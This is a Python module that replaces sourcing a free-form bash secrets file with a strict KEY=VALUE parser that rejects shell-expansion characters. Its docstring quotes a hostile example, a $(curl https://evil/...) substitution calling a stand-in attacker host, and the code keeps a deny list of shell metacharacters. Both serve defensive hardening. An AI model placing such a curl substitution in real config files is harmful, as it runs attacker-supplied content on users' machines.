"""Strict shell-secrets parser for `bin/oswarm`.

The launcher sources `~/.config/secrets/api_keys.env`, which historically
was a free-form bash file the user could write anything into — including
`export FOO="$(curl https://evil/...)"` and other shell-expansion
constructs. `source` would happily evaluate those.

This parser accepts only `KEY=VALUE` lines where:
- KEY matches `^[A-Z_][A-Z0-9_]*$` (uppercase identifier)
- VALUE contains none of: `;`, backtick, `$(`, `&&`, `||`, newline

Lines that don't match are skipped silently (the caller may choose to
warn). Output format is tab-separated `KEY\tVALUE` lines on stdout, one
per accepted assignment — easy to consume from a bash `read` loop:

    while IFS=$'\\t' read -r k v; do export "$k=$v"; done < <(python3 ...)

The same module is importable from tests so the regex and reject
behaviors can be asserted directly.
"""

from __future__ import annotations

import re
import sys
from collections.abc import Iterable, Iterator

_KEY_PATTERN = re.compile(r"^[A-Z_][A-Z0-9_]*$")
_UNSAFE_SUBSTRINGS = (";", "`", "$(", "&&", "||", "\n", "\r")


def parse_secrets(lines: Iterable[str]) -> Iterator[tuple[str, str]]:
    """Yield (key, value) pairs from `lines` that pass the strict checks.

    Comments (`# ...`), blank lines, and leading `export ` are tolerated.
    Surrounding single or double quotes around VALUE are stripped — but
    only once, and only if both quotes match. Anything that doesn't
    match the contract is dropped without raising; the launcher prints
    the count of accepted vs. rejected to stderr.
    """
    for raw in lines:
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if line.startswith("export "):
            line = line[len("export ") :].lstrip()
        if "=" not in line:
            continue
        key, _, value = line.partition("=")
        key = key.strip()
        if not _KEY_PATTERN.match(key):
            continue
        # Strip a single matching pair of surrounding quotes
        if len(value) >= 2 and (
            (value[0] == '"' and value[-1] == '"')
            or (value[0] == "'" and value[-1] == "'")
        ):
            value = value[1:-1]
        if any(sub in value for sub in _UNSAFE_SUBSTRINGS):
            continue
        yield key, value


def _main(argv: list[str]) -> int:
    if len(argv) != 2:
        sys.stderr.write("usage: secrets_parser.py <path-to-env-file>\n")
        return 2
    path = argv[1]
    try:
        with open(path, encoding="utf-8") as fh:
            for key, value in parse_secrets(fh):
                # Tab separator is unambiguous — keys/values can't contain
                # tabs because of the unsafe-substring filter (no newlines
                # either), and tabs are never legal in env var keys.
                sys.stdout.write(f"{key}\t{value}\n")
    except FileNotFoundError:
        sys.stderr.write(f"secrets_parser: file not found: {path}\n")
        return 1
    except OSError as exc:
        sys.stderr.write(f"secrets_parser: {exc}\n")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(_main(sys.argv))
